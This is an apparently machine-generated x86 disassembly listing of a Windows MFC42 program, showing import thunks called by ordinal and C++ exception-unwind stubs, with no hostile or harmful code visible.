jmp [ Ordinal_MFC42_3454@IAT ]
Ordinal_MFC42_3198
jmp [ Ordinal_MFC42_3198@IAT ]
Ordinal_MFC42_6080
jmp [ Ordinal_MFC42_6080@IAT ]
Ordinal_MFC42_6175
jmp [ Ordinal_MFC42_6175@IAT ]
Ordinal_MFC42_4623
jmp [ Ordinal_MFC42_4623@IAT ]
Ordinal_MFC42_4426
jmp [ Ordinal_MFC42_4426@IAT ]
Ordinal_MFC42_3692
jmp [ Ordinal_MFC42_3692@IAT ]
Ordinal_MFC42_3571
jmp [ Ordinal_MFC42_3571@IAT ]
Ordinal_MFC42_652
jmp [ Ordinal_MFC42_652@IAT ]
Ordinal_MFC42_348
jmp [ Ordinal_MFC42_348@IAT ]
Ordinal_MFC42_543
jmp [ Ordinal_MFC42_543@IAT ]
Ordinal_MFC42_338
jmp [ Ordinal_MFC42_338@IAT ]
Ordinal_MFC42_3626
jmp [ Ordinal_MFC42_3626@IAT ]
Ordinal_MFC42_3663
jmp [ Ordinal_MFC42_3663@IAT ]
Ordinal_MFC42_2414
jmp [ Ordinal_MFC42_2414@IAT ]
Ordinal_MFC42_803
jmp [ Ordinal_MFC42_803@IAT ]
Ordinal_MFC42_663
jmp [ Ordinal_MFC42_663@IAT ]
Ordinal_MFC42_4823
jmp [ Ordinal_MFC42_4823@IAT ]
Ordinal_MFC42_613
jmp [ Ordinal_MFC42_613@IAT ]
Ordinal_MFC42_640
jmp [ Ordinal_MFC42_640@IAT ]
Ordinal_MFC42_5785
jmp [ Ordinal_MFC42_5785@IAT ]
Ordinal_MFC42_1640
jmp [ Ordinal_MFC42_1640@IAT ]
Ordinal_MFC42_323
jmp [ Ordinal_MFC42_323@IAT ]
Ordinal_MFC42_289
jmp [ Ordinal_MFC42_289@IAT ]
Ordinal_MFC42_1641
jmp [ Ordinal_MFC42_1641@IAT ]
Ordinal_MFC42_800
jmp [ Ordinal_MFC42_800@IAT ]
Ordinal_MFC42_2818
jmp [ Ordinal_MFC42_2818@IAT ]
Ordinal_MFC42_540
jmp [ Ordinal_MFC42_540@IAT ]
Ordinal_MFC42_4858
jmp [ Ordinal_MFC42_4858@IAT ]
Ordinal_MFC42_1200
jmp [ Ordinal_MFC42_1200@IAT ]
Ordinal_MFC42_2399
jmp [ Ordinal_MFC42_2399@IAT ]
Ordinal_MFC42_6329
jmp [ Ordinal_MFC42_6329@IAT ]
Ordinal_MFC42_1105
jmp [ Ordinal_MFC42_1105@IAT ]
Ordinal_MFC42_1175
jmp [ Ordinal_MFC42_1175@IAT ]
Ordinal_MFC42_5791
jmp [ Ordinal_MFC42_5791@IAT ]
Ordinal_MFC42_4589
jmp [ Ordinal_MFC42_4589@IAT ]
Ordinal_MFC42_4588
jmp [ Ordinal_MFC42_4588@IAT ]
Ordinal_MFC42_4899
jmp [ Ordinal_MFC42_4899@IAT ]
Ordinal_MFC42_4370
jmp [ Ordinal_MFC42_4370@IAT ]
Ordinal_MFC42_4892
jmp [ Ordinal_MFC42_4892@IAT ]
Ordinal_MFC42_5076
jmp [ Ordinal_MFC42_5076@IAT ]
Ordinal_MFC42_4341
jmp [ Ordinal_MFC42_4341@IAT ]
Ordinal_MFC42_4349
jmp [ Ordinal_MFC42_4349@IAT ]
Ordinal_MFC42_4889
jmp [ Ordinal_MFC42_4889@IAT ]
Ordinal_MFC42_4531
jmp [ Ordinal_MFC42_4531@IAT ]
Ordinal_MFC42_4545
jmp [ Ordinal_MFC42_4545@IAT ]
Ordinal_MFC42_4543
jmp [ Ordinal_MFC42_4543@IAT ]
Ordinal_MFC42_4526
jmp [ Ordinal_MFC42_4526@IAT ]
Ordinal_MFC42_4529
jmp [ Ordinal_MFC42_4529@IAT ]
Ordinal_MFC42_4524
jmp [ Ordinal_MFC42_4524@IAT ]
Ordinal_MFC42_4963
jmp [ Ordinal_MFC42_4963@IAT ]
Ordinal_MFC42_4960
jmp [ Ordinal_MFC42_4960@IAT ]
Ordinal_MFC42_4108
jmp [ Ordinal_MFC42_4108@IAT ]
Ordinal_MFC42_6055
jmp [ Ordinal_MFC42_6055@IAT ]
Ordinal_MFC42_1776
jmp [ Ordinal_MFC42_1776@IAT ]
Ordinal_MFC42_5240
jmp [ Ordinal_MFC42_5240@IAT ]
Ordinal_MFC42_5290
jmp [ Ordinal_MFC42_5290@IAT ]
Ordinal_MFC42_3748
jmp [ Ordinal_MFC42_3748@IAT ]
Ordinal_MFC42_1725
jmp [ Ordinal_MFC42_1725@IAT ]
Ordinal_MFC42_4432
jmp [ Ordinal_MFC42_4432@IAT ]
Ordinal_MFC42_517
jmp [ Ordinal_MFC42_517@IAT ]
Ordinal_MFC42_784
jmp [ Ordinal_MFC42_784@IAT ]
Ordinal_MFC42_5260
jmp [ Ordinal_MFC42_5260@IAT ]
Ordinal_MFC42_6131
jmp [ Ordinal_MFC42_6131@IAT ]
Ordinal_MFC42_2614
jmp [ Ordinal_MFC42_2614@IAT ]
Ordinal_MFC42_4723
jmp [ Ordinal_MFC42_4723@IAT ]
Ordinal_MFC42_2723
jmp [ Ordinal_MFC42_2723@IAT ]
Ordinal_MFC42_2390
jmp [ Ordinal_MFC42_2390@IAT ]
Ordinal_MFC42_3059
jmp [ Ordinal_MFC42_3059@IAT ]
Ordinal_MFC42_5100
jmp [ Ordinal_MFC42_5100@IAT ]
Ordinal_MFC42_5103
jmp [ Ordinal_MFC42_5103@IAT ]
Ordinal_MFC42_4467
jmp [ Ordinal_MFC42_4467@IAT ]
Ordinal_MFC42_4303
jmp [ Ordinal_MFC42_4303@IAT ]
Ordinal_MFC42_3350
jmp [ Ordinal_MFC42_3350@IAT ]
Ordinal_MFC42_5012
jmp [ Ordinal_MFC42_5012@IAT ]
Ordinal_MFC42_975
jmp [ Ordinal_MFC42_975@IAT ]
Ordinal_MFC42_5472
jmp [ Ordinal_MFC42_5472@IAT ]
Ordinal_MFC42_3403
jmp [ Ordinal_MFC42_3403@IAT ]
Ordinal_MFC42_2879
jmp [ Ordinal_MFC42_2879@IAT ]
Ordinal_MFC42_2878
jmp [ Ordinal_MFC42_2878@IAT ]
Ordinal_MFC42_4151
jmp [ Ordinal_MFC42_4151@IAT ]
Ordinal_MFC42_4077
jmp [ Ordinal_MFC42_4077@IAT ]
Ordinal_MFC42_5237
jmp [ Ordinal_MFC42_5237@IAT ]
Ordinal_MFC42_5282
jmp [ Ordinal_MFC42_5282@IAT ]
Ordinal_MFC42_2649
jmp [ Ordinal_MFC42_2649@IAT ]
Ordinal_MFC42_1665
jmp [ Ordinal_MFC42_1665@IAT ]
Ordinal_MFC42_4436
jmp [ Ordinal_MFC42_4436@IAT ]
Ordinal_MFC42_4427
jmp [ Ordinal_MFC42_4427@IAT ]
Ordinal_MFC42_674
jmp [ Ordinal_MFC42_674@IAT ]
Ordinal_MFC42_366
jmp [ Ordinal_MFC42_366@IAT ]
Ordinal_MFC42_2117
jmp [ Ordinal_MFC42_2117@IAT ]
Ordinal_MFC42_4457
jmp [ Ordinal_MFC42_4457@IAT ]
Ordinal_MFC42_5252
jmp [ Ordinal_MFC42_5252@IAT ]
Ordinal_MFC42_2585
jmp [ Ordinal_MFC42_2585@IAT ]
Ordinal_MFC42_6154
jmp [ Ordinal_MFC42_6154@IAT ]
Ordinal_MFC42_2530
jmp [ Ordinal_MFC42_2530@IAT ]
Ordinal_MFC42_4365
jmp [ Ordinal_MFC42_4365@IAT ]
Ordinal_MFC42_4056
jmp [ Ordinal_MFC42_4056@IAT ]
Ordinal_MFC42_5471
jmp [ Ordinal_MFC42_5471@IAT ]
Ordinal_MFC42_4121
jmp [ Ordinal_MFC42_4121@IAT ]
Ordinal_MFC42_2389
jmp [ Ordinal_MFC42_2389@IAT ]
Ordinal_MFC42_5085
jmp [ Ordinal_MFC42_5085@IAT ]
Ordinal_MFC42_1709
jmp [ Ordinal_MFC42_1709@IAT ]
Ordinal_MFC42_1714
jmp [ Ordinal_MFC42_1714@IAT ]
Ordinal_MFC42_4404
jmp [ Ordinal_MFC42_4404@IAT ]
Ordinal_MFC42_5234
jmp [ Ordinal_MFC42_5234@IAT ]
Ordinal_MFC42_6369
jmp [ Ordinal_MFC42_6369@IAT ]
Ordinal_MFC42_5279
jmp [ Ordinal_MFC42_5279@IAT ]
Ordinal_MFC42_5258
jmp [ Ordinal_MFC42_5258@IAT ]
Ordinal_MFC42_2444
jmp [ Ordinal_MFC42_2444@IAT ]
Ordinal_MFC42_3722
jmp [ Ordinal_MFC42_3722@IAT ]
Ordinal_MFC42_3402
jmp [ Ordinal_MFC42_3402@IAT ]
Ordinal_MFC42_3698
jmp [ Ordinal_MFC42_3698@IAT ]
Ordinal_MFC42_796
jmp [ Ordinal_MFC42_796@IAT ]
Ordinal_MFC42_567
jmp [ Ordinal_MFC42_567@IAT ]
Ordinal_MFC42_529
jmp [ Ordinal_MFC42_529@IAT ]
Ordinal_MFC42_765
jmp [ Ordinal_MFC42_765@IAT ]
Ordinal_MFC42_2108
jmp [ Ordinal_MFC42_2108@IAT ]
Ordinal_MFC42_3294
jmp [ Ordinal_MFC42_3294@IAT ]
Ordinal_MFC42_6067
jmp [ Ordinal_MFC42_6067@IAT ]
Ordinal_MFC42_3482
jmp [ Ordinal_MFC42_3482@IAT ]
Ordinal_MFC42_5789
jmp [ Ordinal_MFC42_5789@IAT ]
Ordinal_MFC42_2860
jmp [ Ordinal_MFC42_2860@IAT ]
Ordinal_MFC42_6000
jmp [ Ordinal_MFC42_6000@IAT ]
Ordinal_MFC42_4454
jmp [ Ordinal_MFC42_4454@IAT ]
Ordinal_MFC42_6197
jmp [ Ordinal_MFC42_6197@IAT ]
Ordinal_MFC42_5039
jmp [ Ordinal_MFC42_5039@IAT ]
Ordinal_MFC42_6069
jmp [ Ordinal_MFC42_6069@IAT ]
sub_4038be
push [ esp + 0x10 ]
push [ esp + 0x10 ]
push [ esp + 0x10 ]
push [ esp + 0x10 ]
call Ordinal_MFC42_1576
retn 0x10
j_sub_403904
jmp sub_403904
sub_403904
push 0x600
push 0x0
call sub_4038d6
mov [ rw-data ] al
retn
Ordinal_MFC42_1576
jmp [ Ordinal_MFC42_1576@IAT ]
Ordinal_MFC42_1168
jmp [ Ordinal_MFC42_1168@IAT ]
sub_403930
mov eax [ ebp - 0x14 ]
push eax
call ??3@YAXPAX@Z
pop ecx
retn
sub_40393b
mov eax r--data
jmp __CxxFrameHandler
sub_403950
mov eax [ ebp - 0x34 ]
push eax
call sub_401660
retn
sub_40395a
lea ecx [ ebp - 0x30 ]
jmp Ordinal_MFC42_617
sub_403962
mov eax r--data
jmp __CxxFrameHandler
sub_403970
lea ecx [ ebp - 0x6c ]
jmp sub_4016d0
sub_403978
mov eax r--data
jmp __CxxFrameHandler
sub_403990
mov eax [ ebp - 0x10 ]
push eax
call sub_401660
retn
sub_40399a
mov eax r--data
jmp __CxxFrameHandler
sub_4039b0
mov ecx [ ebp - 0x10 ]
jmp Ordinal_MFC42_652
sub_4039b8
mov ecx [ ebp - 0x10 ]
add ecx 0x54
jmp sub_401a80
sub_4039c3
mov eax r--data
jmp __CxxFrameHandler
sub_4039d0
mov ecx [ ebp - 0x10 ]
jmp sub_401940
sub_4039d8
mov eax r--data
jmp __CxxFrameHandler
sub_4039f0
mov ecx [ ebp - 0x10 ]
jmp sub_401940
sub_4039f8
mov eax r--data
jmp __CxxFrameHandler
sub_403a10
mov ecx [ ebp - 0x10 ]
jmp sub_401940
sub_403a18
mov eax r--data
jmp __CxxFrameHandler
sub_403a30
mov ecx [ ebp - 0x14 ]
jmp Ordinal_MFC42_652
sub_403a38
mov ecx [ ebp - 0x14 ]
add ecx 0x54
jmp sub_401a80
sub_403a43
mov ecx [ ebp - 0x14 ]
add ecx 0x74
jmp Ordinal_MFC42_663
sub_403a4e
mov ecx [ ebp - 0x14 ]
add ecx 0x84
jmp sub_4019e0
sub_403a5c
mov ecx [ ebp - 0x10 ]
jmp sub_401940
sub_403a64
mov ecx [ ebp - 0x10 ]
jmp sub_401940
sub_403a6c
mov eax r--data
jmp __CxxFrameHandler
sub_403a80
lea ecx [ ebp - 0x88 ]
jmp Ordinal_MFC42_800
sub_403a8b
lea ecx [ ebp - 0x74 ]
jmp Ordinal_MFC42_613
sub_403a93
lea ecx [ ebp - 0x84 ]
jmp Ordinal_MFC42_640
sub_403a9e
mov eax r--data
jmp __CxxFrameHandler
sub_403ab0
lea ecx [ ebp - 0x80 ]
jmp Ordinal_MFC42_613
sub_403ab8
lea ecx [ ebp - 0xd8 ]
jmp sub_4018d0
sub_403ac3
lea ecx [ ebp - 0xd0 ]
jmp sub_4018d0
sub_403ace
lea ecx [ ebp - 0xb8 ]
jmp Ordinal_MFC42_640
sub_403ad9
lea ecx [ ebp - 0x98 ]
jmp Ordinal_MFC42_640
sub_403ae4
lea ecx [ ebp - 0xe0 ]
jmp sub_4019e0
sub_403aef
lea ecx [ ebp - 0xa8 ]
jmp Ordinal_MFC42_640
sub_403afa
lea ecx [ ebp - 0xe0 ]
jmp sub_401940
sub_403b05
lea ecx [ ebp - 0xd0 ]
jmp sub_401940
sub_403b10
lea ecx [ ebp - 0xd8 ]
jmp sub_401940
sub_403b1b
lea ecx [ ebp - 0xe0 ]
jmp sub_401940
sub_403b26
lea ecx [ ebp - 0xd0 ]
jmp sub_401940
sub_403b31
lea ecx [ ebp - 0xd8 ]
jmp sub_401940
sub_403b3c
mov eax r--data
jmp __CxxFrameHandler
sub_403b50
mov eax [ ebp - 0x10 ]
push eax
call sub_401660
retn
sub_403b5a
mov eax r--data
jmp __CxxFrameHandler
sub_403b70
lea ecx [ ebp - 0x70 ]
jmp Ordinal_MFC42_640
sub_403b78
mov eax r--data
jmp __CxxFrameHandler
sub_403b90
lea ecx [ ebp - 0x64 ]
jmp sub_4010a0
sub_403b98
lea ecx [ ebp - 0x68 ]
jmp Ordinal_MFC42_800
sub_403ba0
mov eax r--data
jmp __CxxFrameHandler
sub_403bb0
mov eax [ ebp - 0x10 ]
push eax
call sub_401660
retn
sub_403bba
mov eax r--data
jmp __CxxFrameHandler
sub_403bd0
mov ecx [ ebp - 0x10 ]
jmp Ordinal_MFC42_674
sub_403bd8
mov eax r--data
jmp __CxxFrameHandler
sub_403bf0
mov ecx [ ebp - 0x10 ]
jmp Ordinal_MFC42_674
sub_403bf8
mov eax r--data
jmp __CxxFrameHandler
sub_403c10
mov ecx [ ebp - 0x10 ]
jmp Ordinal_MFC42_796
sub_403c18
mov eax r--data
jmp __CxxFrameHandler
sub_403c30
mov ecx [ ebp - 0x10 ]
jmp Ordinal_MFC42_796
sub_403c38
mov eax r--data
jmp __CxxFrameHandler
sub_403c50
lea ecx [ ebp - 0x58 ]
jmp Ordinal_MFC42_613
sub_403c58
mov eax r--data
jmp __CxxFrameHandler
